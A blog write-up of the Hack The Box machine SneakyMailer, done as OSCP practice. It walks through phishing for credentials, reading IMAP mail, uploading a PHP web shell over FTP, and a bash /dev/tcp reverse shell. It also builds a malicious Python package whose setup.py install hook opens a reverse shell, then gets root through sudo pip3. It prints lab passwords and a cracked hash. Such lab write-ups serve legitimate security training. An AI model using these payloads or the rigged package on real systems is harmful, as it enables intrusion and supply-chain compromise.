---
title: "Hack The Box - SneakyMailer"
date: 2021-09-29T19:00:30+1:00
categories:
  - HackTheBox
  - WriteUp
  - Linux
tags:
  - OSCP Preparation
  - IMAP
  - PyPi
  - nginx
  - Custom Python Package
  - Nmap
  - Gobuster
---
# Introduction

---

SneakyMailer is a medium rated box. As the name suggest, the box has something to do with emails.

So let's just dive into the box and start enumerating it. 

# Enumeration

---

## Nmap Scan

---

For this task I use the [nmap automator](https://github.com/21y4d/nmapAutomator), here are the results of the full scan:

```bash
PORT     STATE SERVICE     
21/tcp   open  ftp         
22/tcp   open  ssh         
25/tcp   open  smtp        
80/tcp   open  http        
143/tcp  open  imap        
993/tcp  open  imaps       
8080/tcp open  http-proxy
```

On those open ports, the automator will perform a script scan

```bash
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, 
ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: ACL2=UNION OK CHILDREN SORT completed STARTTLS NAMESPACE ACL QUOTA 
THREAD=ORDEREDSUBJECT CAPABILITY THREAD=REFERENCES IMAP4rev1 UTF8=ACCEPTA0001 
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail 
Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: ACL2=UNION OK CHILDREN SORT completed AUTH=PLAIN NAMESPACE ACL 
QUOTA THREAD=ORDEREDSUBJECT CAPABILITY THREAD=REFERENCES IMAP4rev1 UTF8=ACCEPTA0001 
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail 
Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 7 open TCP ports, but no UDP ports are open. 

## Service Enumeration

---

### Port 21: FTP

---

I could not access the FTP server as the anonymous user:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ ftp sneakymailer.htb                                          
Connected to sneakymailer.htb.
220 (vsFTPd 3.0.3)
Name (sneakymailer.htb:user): anonymous
530 Permission denied.
Login failed.
ftp> exit
221 Goodbye.
```

### Port 80: Web

---

When visiting the web page, I get redirected to [http://sneakycorp.htb/](http://sneakycorp.htb/). I add the domain to the hosts file and start the scans again. Here are the gobuster scans of the site:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ gobuster dir -u http://sneakycorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sneakycorp.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,log,txt
[+] Timeout:                 10s
===============================================================
2021/09/23 08:56:33 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 13543]
/img                  (Status: 301) [Size: 185] [--> http://sneakycorp.htb/img/]
/css                  (Status: 301) [Size: 185] [--> http://sneakycorp.htb/css/]
/team.php             (Status: 200) [Size: 26518]                               
/js                   (Status: 301) [Size: 185] [--> http://sneakycorp.htb/js/] 
/vendor               (Status: 301) [Size: 185] [--> http://sneakycorp.htb/vendor/]
/pypi                 (Status: 301) [Size: 185] [--> http://sneakycorp.htb/pypi/]
```

On the team.php page, there are a lot of email addresses. I could check which one works on the email server, but I leave that for later if I'm stuck. The pypi directory returns a 401 (access denied), but I can still scan it. The same for the directory vendor. Here are the results for pypi:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ gobuster dir -u http://sneakycorp.htb/pypi -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-pypi.txt -x php,html,log,txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sneakycorp.htb/pypi
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,log,txt
[+] Timeout:                 10s
===============================================================
2021/09/23 10:31:44 Starting gobuster in directory enumeration mode
===============================================================
/register.php         (Status: 200) [Size: 3115]
```

I visit register.php, it shows me an account register page. Let's try to create an account:

![Untitled](/assets/images/2021-09-29-sneakymailer/Untitled.png)

After submitting the form, it just reloads the page. I noticed in the source that there is no action defined for the form, so this is a rabbit hole. The scans did not find anything, so I started a virtual host scan on all the domains found, and I got the following results:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ gobuster vhost -u http://sneakycorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster-host.txt -k                                                                       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://sneakycorp.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/23 10:45:29 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
```

The dev subdomain points to sneakycorp.htb but with a small addition: On the dashboard, you can see the register page which is located in PyPi. I think I'm finished enumerating this port, so I just downlaod all the email addresses into a file using curl:

```bash
curl -s http://dev.sneakycorp.htb/team.php | grep '@' | cut -d'>' -f2 | cut -d'<' -f1 > emails
```

### Port 8080: Web

---

On this port runs another web server. But this does not have any subdomains or hidden directories. Just the page shown in the image below:

![Untitled](/assets/images/2021-09-29-sneakymailer/Untitled1.png)

### Port 25, 143 & 993: Email

---

The sneakycorp.htb website shows us that the POP3 and SMTP project is finished:

![Untitled](/assets/images/2021-09-29-sneakymailer/Untitled2.png)

So they should work fine. I can now use a tool called swaks to send some phishing emails (maybe there is a cronjob running to simulate real users who clicks on fishing email links):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.16.6/" --server sneakymailer.htb
=== Trying sneakymailer.htb:25...
=== Connected to sneakymailer.htb.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO KaliVM
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<test@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<tigernixon@sneakymailer.htb>
<-  250 2.1.5 Ok
---snip---
-> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 23 Sep 2021 11:31:25 +0200
 -> To: tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb,
 -> From: test@sneakymailer.htb
 -> Subject: test
 -> Message-Id: <20210923113125.048831@KaliVM>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> please click here http://10.10.16.6/
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as EB70624667
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

I just sent an email with a link to myself. I opened up a netcat listener on port 80 to catch all requests (and because it shows more details than the simple http python web server):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ nc -lvnp 80          
listening on [any] 80 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.197] 40254
POST / HTTP/1.1
Host: 10.10.16.6
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

This is a strange post request, I was waiting for a simple get request, but it is posting the credentials for `paulbyrd@sneakymailer.htb: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht`. So I can start exploiting the system.

# Exploitation

---

With these credentials, I should be able to log in to imap as user paulbyrd. To start an IMAP command, you normally use A0001, but it could be anything. I'm glad that it worked here with A0001:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ nc sneakymailer.htb 143
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
A0001 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
A0001 OK LOGIN Ok.
```

To list the mailboxes, IMAP uses the LIST command:

```bash
A0001 LIST "" "*"
* LIST (\Marked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
A0001 OK LIST completed
```

I can start reading mails by selecting a mailbox:

```bash
A0001 SELECT INBOX
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 1 EXISTS
* 1 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
A0001 OK [READ-WRITE] Ok
```

But it is empty, so I try every mailbox:

```bash
A0001 SELECT "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
A0001 OK [READ-WRITE] Ok
```

In "INBOX.Sent Items" 2 mails exists. I can read them by using the `FETCH` command:

```bash
A0001 FETCH 1 BODY.PEEK[]
* 1 FETCH (BODY[] {2167}
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
        boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"
Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset="utf-8"

<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=
hemas-microsoft-com:office:word" xmlns:m=3D"http://schemas.microsoft.com/of=
fice/2004/12/omml" xmlns=3D"http://www.w3.org/TR/REC-html40"><head><meta ht=
tp-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8"><meta name=
=3DGenerator content=3D"Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
.MsoChpDefault
        {mso-style-type:export-only;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style></head><body lang=3DEN-US link=3Dblue vlink=3D"#954F72"><div cla=
ss=3DWordSection1><p class=3DMsoNormal>Hello administrator, I want to chang=
e this password for the developer account</p><p class=3DMsoNormal><o:p>&nbs=
p;</o:p></p><p class=3DMsoNormal>Username: developer</p><p class=3DMsoNorma=
l>Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</p><p class=3DMsoNorm=
al><o:p>&nbsp;</o:p></p><p class=3DMsoNormal>Please notify me when you do i=
t </p></div></body></html>=

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--
)
A0001 OK FETCH completed.
```

The mail gives me credentials for a user: `developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`. You could also read the emails with an email client like evolution (`sudo apt install evolution`). The second mail isn't that helpful at the moment:

```bash
A0001 FETCH 2 BODY.PEEK[]
* 2 FETCH (BODY[] {585}
To: low@debian
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Module testing
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
Date: Wed, 27 May 2020 13:28:58 -0400
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.

)
A0001 OK FETCH completed.
```

I tried to access SSH, but that did not work. I remembered that there is an FTP server running on the machine:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ ftp sneakymailer.htb
Connected to sneakymailer.htb.
220 (vsFTPd 3.0.3)
Name (sneakymailer.htb:user): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30  2020 dev
226 Directory send OK.
ftp> ls dev
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
```

That worked, but it gets better than that. I have access to the web server. So I can place a [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):

```bash
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5488 bytes sent in 0.00 secs (20.4444 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
```

The reverse shell did not correctly work, so I uploaded a webshell first:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ curl http://dev.sneakycorp.htb/cmd.php --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It get's deleted very fast, so I only have little time to execute commands. But I can try to get a reverse shell:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ curl http://dev.sneakycorp.htb/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'"
```

Now, look at the netcat listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.197] 57148
bash: cannot set terminal process group (728): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ which python
which python
/usr/bin/python
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ python -c 'import pty;pty.spawn("/bin/bash")'
</dev$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm
export TERM=xterm
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
zsh: suspended  nc -lvnp 443

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^C
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And a shell spawned. It's time to escalate my privileges.

# Privilege Escalation

---

## www-data → low

---

I run LinPEAS and found this password hash:

```bash
╔══════════╣ Analyzing Htpasswd Files (limit 70)                                                                                                                                                                    
-rw-r--r-- 1 root root 43 May 15  2020 /var/www/pypi.sneakycorp.htb/.htpasswd                                                                                                                                       
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

I can crack that hash with hashcat on my local machine:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ hashcat -m 1600 pypi-hash /usr/share/wordlists/rockyou.txt
---snip---
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
```

There is the password `soufianeelhaoui`. I need to find where PyPI is running. It might run on the nginx server:

```bash
www-data@sneakymailer:/etc/nginx/sites-enabled$ ls 
pypi.sneakycorp.htb  sneakycorp.htb
```

Let's check out pypi.sneakycorp.htb:

```bash
server {
        listen 0.0.0.0:8080 default_server;
        listen [::]:8080 default_server;
        server_name _;
}

server {
        listen 0.0.0.0:8080;
        listen [::]:8080;

        server_name pypi.sneakycorp.htb;

        location / {
                proxy_pass http://127.0.0.1:5000;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
        }
}
```

The server is running on the same homepage as the file name suggests it. I add it to the hosts file and visit the webpage ([http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/)):

![Untitled](/assets/images/2021-09-29-sneakymailer/Untitled3.png)

You can exploit this system by uploading packages to the page. Here is an example (you need some additional files in order to make this work, but I wanted to mention it here):

[GitHub - mschwager/0wned: Code execution via Python package installation.](https://github.com/mschwager/0wned)

I need to create the following structure to exploit the server (The files can be empty):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ tree revshell
revshell
├── README.md
├── revshell
│   └── __init__.py
├── setup.cfg
└── setup.py

1 directory, 4 files
```

Now, edit [setup.py](http://setup.py) and insert the following code:

```python
import os
import socket
import subprocess
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        RHOST = '10.10.16.6'
        RPORT = 443
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        for i in range(3):
            os.dup2(s.fileno(), i)
        p = subprocess.call(["/bin/sh","-i"])

setup(name='revshell',
      version='0.0.1',
      description='Reverse Shell',
      author='gian',
      author_email='gian',
      url='http://sneakycopy.htb',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': Exploit})
```

It's time to create the packet with sdist:

```python
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer/revshell]
└─$ python3 setup.py sdist
running sdist
running egg_info
creating revshell.egg-info
writing revshell.egg-info/PKG-INFO
writing dependency_links to revshell.egg-info/dependency_links.txt
writing top-level names to revshell.egg-info/top_level.txt
writing manifest file 'revshell.egg-info/SOURCES.txt'
reading manifest file 'revshell.egg-info/SOURCES.txt'
writing manifest file 'revshell.egg-info/SOURCES.txt'
running check
creating revshell-0.0.1
creating revshell-0.0.1/revshell.egg-info
copying files to revshell-0.0.1...
copying README.md -> revshell-0.0.1
copying setup.cfg -> revshell-0.0.1
copying setup.py -> revshell-0.0.1
copying revshell.egg-info/PKG-INFO -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/SOURCES.txt -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/dependency_links.txt -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/not-zip-safe -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/top_level.txt -> revshell-0.0.1/revshell.egg-info
Writing revshell-0.0.1/setup.cfg
Creating tar archive
removing 'revshell-0.0.1' (and everything under it)
```

A `/dist` directory got created:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer/revshell]
└─$ ls -l dist
total 4
-rw-r--r-- 1 user user 1103 Sep 23 14:53 revshell-0.0.1.tar.gz
```

To package for a remote host, you need to create an additional file inside of your home directory:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer/revshell]
└─$ cat ~/.pypirc                                                                                                                                                                                            
[distutils]
index-servers =
  sneaky
[sneaky]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

Now, you must create the package and upload it in the one command (else it will not work):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer/revshell]
└─$ python setup.py sdist upload -r sneaky
/usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: 
'zip_safe' warnings.warn(msg)
running sdist
running check
warning: sdist: manifest template 'MANIFEST.in' does not exist (using default file list)

warning: sdist: standard file not found: should have one of README, README.txt

writing manifest file 'MANIFEST'
creating revshell-0.0.1
making hard links in revshell-0.0.1...
hard linking setup.cfg -> revshell-0.0.1
hard linking setup.py -> revshell-0.0.1
Creating tar archive
removing 'revshell-0.0.1' (and everything under it)
running upload
Submitting dist/revshell-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080
Server response (200): OK
```

That was fast, I could not even see the package appearing on the page. Look at the netcat listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ nc -lvnp 443              
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.197] 54074
$ python -c 'import pty;pty.spawn("/bin/bash")'
low@sneakymailer:/$ export TERM=xterm
export TERM=xterm
low@sneakymailer:/$ ^Z
zsh: suspended  nc -lvnp 443

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/sneakymailer]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

low@sneakymailer:/$ id
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),
44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)
low@sneakymailer:/$ ^C
```

There is the shell as user low. 

### User Flag

---

It's time to get that flag:

```bash
low@sneakymailer:~$ cat user.txt
3d**************************7d3a
```

## low → root

---

The first thing I always try is to check if the user can execute anything as root:

```bash
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```

I can execute pip as sudo, that is perfect. A quick look at GTFO bin shows me a way to exploit this:

[pip | GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo)

So let's exploit this the way GTFOBins shows me:

```bash
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.8nIkUcTw9y
# python -c 'import pty;pty.spawn("/bin/bash")'
root@sneakymailer:/tmp/pip-req-build-g0n60hpp# whoami
root
```

And there is the root shell.

### Root Flag

---

Time to get the root flag:

```bash
root@sneakymailer:/# cd root
root@sneakymailer:~# cat root.txt
4d**************************50e6
```

# Conclusions

---

This box was a very good training for the OSCP exam. I learned a lot. To get initial access on the box was kinda tricky, but the privesc to user low was too hard. I had to get a quick hint from a write up. The privesc from low to root was pretty easy and straight forward. Here is the write up I used to get a hint for the privesc:

[HTB: SneakyMailer](https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html#enumeration)